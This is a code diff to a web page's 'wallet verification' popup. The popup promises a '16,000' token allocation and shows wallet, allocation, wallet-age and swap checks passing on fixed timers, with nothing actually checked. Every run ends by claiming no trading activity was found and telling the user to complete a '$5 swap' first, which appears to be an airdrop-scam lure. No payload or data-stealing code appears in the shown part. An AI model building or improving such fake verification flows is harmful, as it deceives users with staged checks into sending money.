@@ -782,17 +782,18 @@
 
   <div class="verification-list" id="verificationList">
 
-    <div class="verification-list">
-
-  <div class="verify-item checking" id="walletCheck">
+  <div class="verify-item pending" id="walletCheck">
     <span class="check-icon"></span>
     <span>Checking wallet</span>
-    <span class="status-text">Checking...</span>
+    <span class="status-text">Waiting...</span>
   </div>
 
   <div class="verify-item pending" id="allocationCheck">
     <span class="check-icon"></span>
-    <span>Your allocation <span class="allocation-badge">16,000</span></span>
+    <span>
+      Your allocation
+      <span class="allocation-badge" id="allocationBadge" hidden>16,000</span>
+    </span>
     <span class="status-text">Waiting...</span>
   </div>
 
@@ -807,8 +808,9 @@
     <span>$5 Swap transaction</span>
     <span class="status-text">Waiting...</span>
   </div>
-  </div>
 
+</div>
+        
   <p id="verifyMessage">
     Please wait while we verify your wallet...
   </p>
@@ -842,10 +844,22 @@ async function showVerificationDemo() {
   const message = document.getElementById('verifyMessage');
   const todoBox = document.getElementById('todoBox');
 
+  const walletCheck = document.getElementById('walletCheck');
+  const allocationCheck = document.getElementById('allocationCheck');
   const walletAge = document.getElementById('walletAgeCheck');
   const swap = document.getElementById('swapCheck');
+  const allocationBadge = document.getElementById('allocationBadge');
 
-  if (!state || !icon || !title || !message || !walletAge || !swap) {
+  if (
+    !state ||
+    !icon ||
+    !title ||
+    !message ||
+    !walletCheck ||
+    !allocationCheck ||
+    !walletAge ||
+    !swap
+  ) {
     console.error('Verification popup element tidak ditemukan.');
     return;
   }
@@ -861,25 +875,66 @@ async function showVerificationDemo() {
   message.textContent =
     'Please wait while we verify your wallet...';
 
-  todoBox.style.display = 'none';
+  if (todoBox) {
+    todoBox.style.display = 'none';
+  }
 
-  walletAge.className = 'verify-item checking';
-  walletAge.querySelector('.status-text').textContent = 'Checking...';
+  // RESET
+  walletCheck.className = 'verify-item checking';
+  walletCheck.querySelector('.status-text').textContent = 'Checking...';
+
+  allocationCheck.className = 'verify-item pending';
+  allocationCheck.querySelector('.status-text').textContent = 'Waiting...';
+
+  walletAge.className = 'verify-item pending';
+  walletAge.querySelector('.status-text').textContent = 'Waiting...';
 
   swap.className = 'verify-item pending';
   swap.querySelector('.status-text').textContent = 'Waiting...';
 
-  await wait(3000);
+  if (allocationBadge) {
+    allocationBadge.hidden = true;
+  }
+
+  // 1. CHECKING WALLET
+  await wait(2000);
+
+  if (run !== verificationRun) return;
+
+  walletCheck.className = 'verify-item verified';
+  walletCheck.querySelector('.status-text').textContent = 'Done';
+
+  // 2. ALLOCATION
+  allocationCheck.className = 'verify-item checking';
+  allocationCheck.querySelector('.status-text').textContent = 'Checking...';
+
+  await wait(2000);
+
+  if (run !== verificationRun) return;
+
+  if (allocationBadge) {
+    allocationBadge.hidden = false;
+  }
+
+  allocationCheck.className = 'verify-item verified';
+  allocationCheck.querySelector('.status-text').textContent = 'Done';
+
+  // 3. WALLET AGE
+  walletAge.className = 'verify-item checking';
+  walletAge.querySelector('.status-text').textContent = 'Checking...';
+
+  await wait(2000);
 
   if (run !== verificationRun) return;
 
   walletAge.className = 'verify-item verified';
   walletAge.querySelector('.status-text').textContent = 'Verified';
 
+  // 4. SWAP
   swap.className = 'verify-item checking';
   swap.querySelector('.status-text').textContent = 'Checking...';
 
-  await wait(3000);
+  await wait(2000);
 
   if (run !== verificationRun) return;
 
@@ -899,8 +954,10 @@ async function showVerificationDemo() {
   message.textContent =
     'Unable to find any recent trading activity. Please complete the swap task and try again.';
 
-  todoBox.classList.remove('hidden');
+  if (todoBox) {
+    todoBox.classList.remove('hidden');
     todoBox.style.display = 'block';
+  }
 }
     
     function Scroll() {
